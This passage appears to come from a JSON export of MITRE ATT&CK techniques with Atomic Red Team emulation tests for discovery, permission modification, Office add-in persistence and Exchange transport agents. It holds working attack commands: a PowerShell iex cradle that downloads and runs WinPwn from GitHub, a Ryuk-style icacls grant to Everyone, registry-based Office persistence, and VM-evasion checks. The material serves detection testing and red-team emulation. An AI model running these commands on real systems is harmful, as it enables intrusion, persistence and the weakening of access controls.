"data_components": ["Command Execution", "Process Creation", "OS API Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.", "atomic_tests": [{"name": "Win32_PnPEntity Hardware Inventory", "auto_generated_guid": "2cb4dbf2-2dca-4597-8678-4d39d207a3a5", "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity", "supported_platforms": ["windows"], "executor": {"command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt", "cleanup_command": "Remove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore", "name": "powershell"}}, {"name": "WinPwn - printercheck", "auto_generated_guid": "cb6e76ca-861e-4a7f-be08-564caa3e6f75", "description": "Search for printers / potential vulns using printercheck function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput", "name": "powershell"}}]}, "T1222.001": {"name": "Windows File and Directory Permissions Modification", "technique_id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee", "external_id": "T1222.001", "data_components": ["Command Execution", "File Metadata", "Active Directory Object Modification", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).", "atomic_tests": [{"name": "Take ownership using takeown utility", "auto_generated_guid": "98d34bb4-6e75-42ad-9c41-1dae7dc6a001", "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n", "supported_platforms": ["windows"], "input_arguments": {"file_folder_to_own": {"description": "Path of the file or folder for takeown to take ownership.", "type": "path", "default": "%temp%\\T1222.001_takeown_folder"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Test requrires a file to take ownership of to be located at (#{file_folder_to_own})\n", "prereq_command": "IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{file_folder_to_own}\necho T1222.001_takeown1 >> #{file_folder_to_own}\\T1222.001_takeown1.txt\necho T1222.001_takeown2 >> #{file_folder_to_own}\\T1222.001_takeown2.txt\n"}], "executor": {"command": "takeown.exe /f #{file_folder_to_own} /r\n", "name": "command_prompt"}}, {"name": "cacls - Grant permission to specified user or group recursively", "auto_generated_guid": "a8206bcc-f282-40a9-a389-05d9c0263485", "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder to change permissions.", "type": "path", "default": "%temp%\\T1222.001_cacls"}, "user_or_group": {"description": "User or group to allow full control", "type": "string", "default": "Everyone"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Test requrires a file to modify to be located at (#{file_or_folder})\n", "prereq_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{file_or_folder}\necho T1222.001_cacls1 >> #{file_or_folder}\\T1222.001_cacls1.txt\necho T1222.001_cacls2 >> #{file_or_folder}\\T1222.001_cacls2.txt\n"}], "executor": {"command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F\n", "name": "command_prompt"}}, {"name": "attrib - Remove read-only attribute", "auto_generated_guid": "bec1e95c-83aa-492e-ab77-60c71bbd21b0", "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n", "supported_platforms": ["windows"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder remove attribute.", "type": "path", "default": "%temp%\\T1222.001_attrib"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Test requrires a file to modify to be located at (#{file_or_folder})\n", "prereq_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{file_or_folder}\necho T1222.001_attrib1 >> #{file_or_folder}\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> #{file_or_folder}\\T1222.001_attrib2.txt\nattrib.exe +r #{file_or_folder}\\T1222.001_attrib1.txt\nattrib.exe +r #{file_or_folder}\\T1222.001_attrib2.txt\n"}], "executor": {"command": "attrib.exe -r #{file_or_folder}\\*.* /s\n", "name": "command_prompt"}}, {"name": "attrib - hide file", "auto_generated_guid": "32b979da-7b68-42c9-9a99-0e39900fc36c", "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n", "supported_platforms": ["windows"], "input_arguments": {"file_or_folder": {"description": "Path of the files to hide.", "type": "path", "default": "%temp%\\T1222.001_attrib_2"}}, "executor": {"command": "mkdir #{file_or_folder} >nul 2>&1\necho T1222.001_attrib1 >> #{file_or_folder}\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> #{file_or_folder}\\T1222.001_attrib2.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib1.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib2.txt\n", "cleanup_command": "del /A:H #{file_or_folder}\\T1222.001_attrib*.txt >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style", "auto_generated_guid": "ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6", "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n", "supported_platforms": ["windows"], "input_arguments": {"path": {"description": "Path of folder to recursively set permissions on", "type": "path", "default": "C:\\Users\\Public\\*"}, "file_path": {"description": "Path of folder permission back", "type": "path", "default": "%temp%\\T1222.001-folder-perms-backup.txt"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Backup of original folder permissions should exist (for use in cleanup commands)\n", "prereq_command": "IF EXIST #{file_path} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "icacls #{path} /save #{file_path} /t /q >nul 2>&1\n"}], "executor": {"command": "icacls \"#{path}\" /grant Everyone:F /T /C /Q", "cleanup_command": "icacls '#{path}' /restore #{file_path} /q >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1137.006": {"name": "Add-ins", "technique_id": "attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d", "external_id": "T1137.006", "data_components": ["Windows Registry Key Creation", "Process Creation", "File Creation", "Windows Registry Key Modification", "File Modification", "Command Execution"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ", "atomic_tests": [{"name": "Code Executed Via Excel Add-in File (XLL)", "auto_generated_guid": "441b1a0f-a771-428a-8af0-e99e4698cda3", "description": "Loads an XLL file using the excel add-ins library.\nThis causes excel to launch Notepad.exe as a child process. This atomic test does not include persistent code execution as you would typically see when this is implemented in malware.\n", "supported_platforms": ["windows"], "dependencies": [{"description": "Microsoft Excel must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"}, {"description": "XLL files must exist on disk at specified location", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""}], "executor": {"name": "powershell", "command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n", "cleanup_command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n"}}, {"name": "Persistent Code Execution Via Excel Add-in File (XLL)", "auto_generated_guid": "9c307886-9fef-41d5-b344-073a0f5b2f5f", "description": "Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started\nThe sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\n", "supported_platforms": ["windows"], "dependencies": [{"description": "Microsoft Excel must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"}, {"description": "XLL files must exist on disk at specified location", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""}], "executor": {"name": "powershell", "command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n", "cleanup_command": "$ver = (New-Object -COMObject \"Excel.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\" -ErrorAction Ignore\n"}}, {"name": "Persistent Code Execution Via Word Add-in File (WLL)", "auto_generated_guid": "95408a99-4fa7-4cd6-a7ef-cb65f86351cf", "description": "Creates a Word Add-in file (WLL) which runs automatically when Word is started\nThe sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\nSuccessfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. \n", "supported_platforms": ["windows"], "dependencies": [{"description": "Microsoft Word must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"}, {"description": "WLL files must exist on disk at specified location", "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\")) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\""}], "executor": {"name": "powershell", "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n", "cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\" -ErrorAction Ignore\n"}}, {"name": "Persistent Code Execution Via Excel VBA Add-in File (XLAM)", "auto_generated_guid": "082141ed-b048-4c86-99c7-2b8da5b5bf48", "description": "Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started\nThe sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.\n", "supported_platforms": ["windows"], "dependencies": [{"description": "Microsoft Excel must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"}, {"description": "XLAM file must exist on disk at specified location", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\""}], "executor": {"name": "powershell", "command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\"\n", "cleanup_command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\" -ErrorAction Ignore\n"}}, {"name": "Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)", "auto_generated_guid": "f89e58f9-2b49-423b-ac95-1f3e7cfd8277", "description": "Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started\nThe sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.\n", "supported_platforms": ["windows"], "dependencies": [{"description": "Microsoft Excel must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"PowerPoint.Application\" | Out-Null\n  Stop-Process -Name \"PowerPnt\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft PowerPoint manually to meet this requirement\"\n"}, {"description": "PPAM file must exist on disk at specified location", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\""}], "executor": {"name": "powershell", "command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n", "cleanup_command": "$ver = (New-Object -COMObject \"PowerPoint.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"PowerPnt\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.ppam\"  -ErrorAction Ignore"}}]}, "T1505.002": {"name": "Transport Agent", "technique_id": "attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1", "external_id": "T1505.002", "data_components": ["Application Log Content", "File Creation"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ", "atomic_tests": [{"name": "Install MS Exchange Transport Agent Persistence", "auto_generated_guid": "43e92449-ff60-46e9-83a3-1a38089df94d", "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n", "supported_platforms": ["windows"], "input_arguments": {"class_factory": {"description": "Class factory of transport agent.", "type": "string", "default": "Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory"}, "dll_path": {"description": "Path of DLL to use as transport agent.", "type": "path", "default": "c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll"}, "transport_agent_identity": {"description": "Friendly name of transport agent once installed.", "type": "string", "default": "Security Interop Agent"}}, "dependencies": [{"description": "Microsoft Exchange SnapIn must be installed\n", "prereq_command": "Get-TransportAgent -TransportService FrontEnd\n", "get_prereq_command": "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn\n"}], "executor": {"command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "cleanup_command": "if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){\n  Disable-TransportAgent #{transport_agent_identity}\n  Uninstall-TransportAgent #{transport_agent_identity}\n  Get-TransportAgent\n}\n", "name": "powershell", "elevation_required": true}}]}, "T1082": {"name": "System Information Discovery", "technique_id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1", "external_id": "T1082", "data_components": ["Process Creation", "OS API Execution", "Command Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)", "atomic_tests": [{"name": "System Information Discovery", "auto_generated_guid": "66703791-c902-4560-8770-42b8a91f7667", "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "name": "command_prompt"}}, {"name": "System Information Discovery", "auto_generated_guid": "edff98ec-0f73-4f63-9890-6b117092aff6", "description": "Identify System Info\n", "supported_platforms": ["macos"], "executor": {"command": "system_profiler\nls -al /Applications\n", "name": "sh"}}, {"name": "List OS Information", "auto_generated_guid": "cccb070c-df86-4216-a5bc-9fb60c74e27c", "description": "Identify System Info\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Output file used to store the results.", "type": "path", "default": "/tmp/T1082.txt"}}, "executor": {"command": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm #{output_file} 2>/dev/null\n", "name": "sh"}}, {"name": "Linux VM Check via Hardware", "auto_generated_guid": "31dad7ad-2286-4c02-ae92-274418c85fec", "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n", "supported_platforms": ["linux"], "executor": {"elevation_required": true, "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n", "name": "bash"}}, {"name": "Linux VM Check via Kernel Modules", "auto_generated_guid": "8057d484-0fae-49a4-8302-4812c4f1e64e", "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n", "supported_platforms": ["linux"], "executor": {"command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "name": "bash"}}, {"name": "FreeBSD VM Check via Kernel Modules", "auto_generated_guid": "eefe6a49-d88b-41d8-8fc2-b46822da90d3", "description": "Identify virtual machine host kernel modules.\n", "supported_platforms": ["linux"], "executor": {"command": "kldstat | grep -i \"vmm\"\nkldstat | grep -i \"vbox\"\n", "name": "sh"}}, {"name": "Hostname Discovery (Windows)", "auto_generated_guid": "85cfbf23-4a1e-4342-8792-007e004b975f", "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "hostname\n", "name": "command_prompt"}}, {"name": "Hostname Discovery", "auto_generated_guid": "486e88ea-4f56-470f-9b57-3f4d73f39133", "description": "Identify system hostname for FreeBSD, Linux and macOS systems.\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "hostname\n", "name": "sh"}}, {"name": "Windows MachineGUID Discovery", "auto_generated_guid": 